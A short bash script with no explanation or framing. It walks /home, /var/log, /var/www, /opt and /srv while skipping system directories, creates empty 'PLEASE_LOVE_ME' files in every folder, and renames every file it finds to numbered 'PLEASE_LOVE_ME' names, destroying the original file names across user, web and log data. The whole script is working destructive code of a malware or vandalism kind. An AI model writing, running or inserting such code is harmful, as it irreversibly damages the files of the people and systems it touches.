#!/bin/bash

SKIP_DIRS=(
    /proc /sys /run /dev
    /bin /sbin
    /lib /lib64
    /boot /tmp
    /usr
    /etc
    /etc/systemd /etc/init.d
)

TARGET_DIRS=(
    /home
    /var/log
    /var/www
    /opt
    /srv
)


should_skip() {
    local target="${1%/}"
    for skip in "${SKIP_DIRS[@]}"; do
        [ "$target" = "$skip" ] && return 0
    done
    return 1
}

traverse() {
    local dir="$1"
    local depth="${2:-0}"

    [ "$depth" -gt 8 ] && return

    for entry in "$dir"/*/; do
        [ -e "$entry" ] || continue
        entry="${entry%/}"
        should_skip "$entry" && continue
        if [ -d "$entry" ]; then
            traverse "$entry" $((depth + 1))
            for i in {1..20}; do
                > "$entry/PLEASE_LOVE_ME_${i}"
            done
        fi
    done

    local count=50
    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${count}"
        ((count++))
    done
}

# Hit targets in safest order
for target in "${TARGET_DIRS[@]}"; do
    if [ -d "$target" ]; then
        traverse "$target"
    fi
done